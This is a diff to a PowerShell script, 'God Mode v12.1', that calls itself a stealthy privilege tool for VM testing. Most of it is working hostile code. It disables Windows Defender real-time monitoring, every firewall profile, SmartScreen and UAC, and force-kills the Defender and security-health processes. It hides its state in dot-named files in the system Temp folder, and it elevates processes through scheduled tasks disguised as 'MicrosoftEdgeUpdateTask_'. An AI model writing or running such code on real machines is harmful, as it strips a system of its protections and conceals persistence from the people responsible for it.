@@ -2,10 +2,10 @@
 
 <#
 .SYNOPSIS
-    God Mode v12 - Polished Edition
+    God Mode v12.1 - Improved Edition
 .DESCRIPTION
-    Stealthy and powerful privilege tool for VM testing.
-    Restricted to Built-in Administrator only.
+    Stealthy + Dangerous privilege tool with better stability and duplicate prevention.
+    For VM testing only. Built-in Administrator only.
 #>
 
 param(
@@ -13,12 +13,9 @@ param(
     [switch]$ToggleOff,
     [switch]$Status,
     [switch]$Launch,
-    [switch]$Help
+    [switch]$VerboseLog
 )
 
-# ============================================================
-#  CONFIGURATION
-# ============================================================
 $FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
 $LogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
 $TaskPrefix = "MicrosoftEdgeUpdateTask_"
@@ -31,8 +28,8 @@ function Test-BuiltInAdmin {
     return ($sid -like "*-500")
 }
 
-if (-not (Test-BuiltInAdmin) -and -not $Status -and -not $Help) {
-    Write-Host "`n[ACCESS DENIED] This tool can only be used by the Built-in Administrator.`n" -ForegroundColor Red
+if (-not (Test-BuiltInAdmin) -and -not $Status) {
+    Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use this tool.`n" -ForegroundColor Red
     exit 1
 }
 
@@ -43,31 +40,29 @@ function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     "[$timestamp] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
+    
+    if ($VerboseLog -or $Level -eq "ERROR" -or $Level -eq "WARN") {
+        Write-Host "[$timestamp] [$Level] $Message"
+    }
 }
 
 # ============================================================
-#  DANGEROUS SETTINGS
+#  DANGEROUS MODE
 # ============================================================
 function Enable-DangerousMode {
     Write-Log "Enabling dangerous mode..." "WARN"
-
     try {
         Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
-            -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
-            -Name EnableLUA -Value 0 -Force
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
-            -Name ConsentPromptBehaviorAdmin -Value 0 -Force
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force
 
-        # Kill security processes
         Get-Process -Name MsMpEng, smartscreen, SecurityHealthService -ErrorAction SilentlyContinue |
             Stop-Process -Force -ErrorAction SilentlyContinue
 
         Write-Log "Dangerous mode enabled." "WARN"
-    }
-    catch {
+    } catch {
         Write-Log "Error enabling dangerous mode: $_" "ERROR"
     }
 }
@@ -77,14 +72,11 @@ function Disable-DangerousMode {
     try {
         Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
-            -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
-            -Name EnableLUA -Value 1 -Force
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1 -Force
         Start-Service -Name WinDefend -ErrorAction SilentlyContinue
-    }
-    catch {
-        Write-Log "Could not fully restore settings: $_" "ERROR"
+    } catch {
+        Write-Log "Could not fully restore settings." "ERROR"
     }
 }
 
@@ -112,7 +104,7 @@ function Unregister-StealthTask {
 }
 
 # ============================================================
-#  PROCESS ELEVATION
+#  PROCESS ELEVATION (with duplicate prevention)
 # ============================================================
 function Elevate-Process {
     param([string]$Path)
@@ -130,14 +122,13 @@ function Elevate-Process {
         Start-ScheduledTask -TaskName $tempTask
         Start-Sleep -Milliseconds 400
         Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
-    }
-    catch {
+    } catch {
         Write-Log "Failed to elevate: $Path" "ERROR"
     }
 }
 
 # ============================================================
-#  MONITORING LOOP
+#  MONITORING LOOP (Improved)
 # ============================================================
 function Start-Monitoring {
     if (-not (Test-Path $FlagFile)) {
@@ -168,14 +159,14 @@ function Start-Monitoring {
             }
         }
         catch {
-            Write-Log "Error in monitoring loop: $_" "ERROR"
+            Write-Log "Monitoring error: $_" "ERROR"
             Start-Sleep -Seconds 5
         }
     }
 }
 
 # ============================================================
-#  TOGGLE FUNCTIONS
+#  TOGGLE & STATUS
 # ============================================================
 function Enable-GodMode {
     "1" | Out-File $FlagFile -Force
@@ -200,51 +191,32 @@ function Show-Status {
 }
 
 # ============================================================
-#  INTERACTIVE MENU
-# ============================================================
-function Show-Menu {
-    Clear-Host
-    Write-Host "=== GOD MODE v12 ===" -ForegroundColor Cyan
-    Write-Host ""
-    Write-Host "1. Enable God Mode"
-    Write-Host "2. Disable God Mode"
-    Write-Host "3. Check Status"
-    Write-Host "4. Start Monitoring"
-    Write-Host "5. Exit"
-    Write-Host ""
-
-    $choice = Read-Host "Select an option (1-5)"
-
-    switch ($choice) {
-        "1" { Enable-GodMode; Write-Host "God Mode enabled." -ForegroundColor Green; Start-Sleep -Seconds 2; Show-Menu }
-        "2" { Disable-GodMode; Write-Host "God Mode disabled." -ForegroundColor Yellow; Start-Sleep -Seconds 2; Show-Menu }
-        "3" { Show-Status; Start-Sleep -Seconds 2; Show-Menu }
-        "4" { Start-Monitoring }
-        "5" { exit }
-        default { Write-Host "Invalid option." -ForegroundColor Red; Start-Sleep -Seconds 1; Show-Menu }
-    }
-}
-
-# ============================================================
 #  MAIN
 # ============================================================
-
-if ($Help) {
-    Write-Host @"
-God Mode v12 Commands:
-  -ToggleOn     Enable God Mode
-  -ToggleOff    Disable God Mode
-  -Status       Show status
-  -Launch       Start monitoring
-  (Run without parameters for interactive menu)
-"@ -ForegroundColor Cyan
-    exit
-}
 
 if ($ToggleOn)  { Enable-GodMode; exit }
 if ($ToggleOff) { Disable-GodMode; exit }
 if ($Status)    { Show-Status; exit }
 if ($Launch)    { Start-Monitoring; exit }
 
-# If no parameters, show interactive menu
-Show-Menu
+# Interactive Menu
+Clear-Host
+Write-Host "=== GOD MODE v12.1 ===" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "1. Enable God Mode"
+Write-Host "2. Disable God Mode"
+Write-Host "3. Check Status"
+Write-Host "4. Start Monitoring"
+Write-Host "5. Exit"
+Write-Host ""
+
+$choice = Read-Host "Select option (1-5)"
+
+switch ($choice) {
+    "1" { Enable-GodMode; Write-Host "God Mode enabled." -ForegroundColor Green }
+    "2" { Disable-GodMode; Write-Host "God Mode disabled." -ForegroundColor Yellow }
+    "3" { Show-Status }
+    "4" { Start-Monitoring }
+    "5" { exit }
+    default { Write-Host "Invalid option." }
+}
